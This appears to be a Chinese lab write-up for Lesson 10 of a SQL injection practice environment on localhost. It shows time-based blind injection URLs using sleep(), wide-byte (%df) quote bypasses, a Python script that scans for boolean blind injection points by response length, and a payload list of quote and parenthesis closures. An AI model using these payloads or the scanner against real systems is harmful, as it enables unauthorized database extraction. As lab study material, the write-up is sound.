# Lesson-10
```
时间盲注-,-宽字节注入-,-Bool盲注
```

和第九题一样 , 将单引号换成双引号就好了
```
http://127.0.0.1/Less-10/?id=1
http://127.0.0.1/Less-10/?id=1%22
http://127.0.0.1/Less-10/?id=1%22%20and%20sleep(1)--+
http://127.0.0.1/Less-10/?id=1%22%20and%20(%271%27=%27%27%20or%20sleep(3))--+
http://127.0.0.1/Less-10/?id=1%22%20and%20(()%20or%20sleep(3))--+
```
> 后记 : 
之后写了一个批量检测Bool盲注的脚本 : 
跑了之后发现竟然还有Bool盲注的注入点 : 
```
0"|()--+
0%df"|()--+
```

这两种情况都可以盲注 , 可以利用之前的脚本去跑 , 可以脱库
下面是批量检测是否为Bool盲注的脚本 , 比较忙 , 写的很简陋
主要是通过判断页面长度来判定是否是Bool盲注
感觉这种判断的机制并不是很科学 , 以后可能还需要添加关键字判断什么的
```
#!/usr/bin/env python
# encoding:utf8
import requests

rules = open('rules', 'r')

baseUrl = "http://127.0.0.1/Less-10/?id="

url = baseUrl + "1"

contentLength = len(requests.get(url).text)
print "正常返回长度为 : ",contentLength

for line in rules:
	if line.startswith("#"):
		continue
	if line == "\r\n":
		continue
	line = line[0:-1]
	startTemp = line.split("()")[0]
	endTemp = line.split("()")[1]
	testUrl1 = baseUrl + startTemp + "0" + endTemp
	testUrl2 = baseUrl + startTemp + "1" + endTemp
	# print "Checking : " + testUrl1 + "\t",
	len1 = len(requests.get(testUrl1).text)
	# print len1
	len2 = len(requests.get(testUrl2).text)
	# print testUrl2,"\t",len2
	if (len1 != contentLength) and (len2 == contentLength):
		print baseUrl + line
```
```
# 如下语句 : 如果返回正常 , 说明猜测成功
0|()--+
0'|()--+
0"|()--+
0)|()--+
0')|()--+
0")|()--+
0))|()--+
0'))|()--+
0"))|()--+
0)))|()--+
#####################################
# 当单引号被过滤(去掉)
0%df'|()--+
0%df')|()--+
0%df'))|()--+
#####################################
# 当双引号被过滤
0%df"|()--+
0%df")|()--+
0%df"))|()--+
```
